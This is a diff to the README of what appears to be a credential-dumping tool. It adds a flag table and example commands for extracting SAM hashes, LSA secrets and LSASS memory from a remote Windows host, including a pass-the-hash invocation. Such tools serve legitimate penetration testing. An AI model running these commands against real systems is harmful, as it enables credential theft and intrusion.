@@ -94,16 +94,28 @@ Dependencies: `smbprotocol` + `pycryptodome` only.
 
 ## Usage
 
+Three flags, combine as needed:
+
+| Flag | What it does |
+|---|---|
+| `--sam` | Extract SAM hashes (local NTLM) |
+| `--lsa` | Extract LSA secrets (DPAPI, service passwords) |
+| `--lsass` | Dump + parse LSASS memory (live credentials) |
+
 ```bash
-# Pick what you need
 python main.py -t 10.0.0.5 -u admin -p pass --sam
 python main.py -t 10.0.0.5 -u admin -p pass --lsa
 python main.py -t 10.0.0.5 -u admin -p pass --lsass
+python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa
+python main.py -t 10.0.0.5 -u admin -p pass --sam --lsass
+python main.py -t 10.0.0.5 -u admin -p pass --lsa --lsass
 python main.py -t 10.0.0.5 -u admin -p pass --sam --lsa --lsass
 
 # Pass-the-Hash
-python main.py -t 10.0.0.5 -u admin -H aad3b435b51404eeaad3b435b51404ee --sam
+python main.py -t 10.0.0.5 -u admin -H aad3b4...ef40 --sam --lsa
 ```
+
+At least one flag is required. Order doesn't matter.
 
 ## Agent internals
 
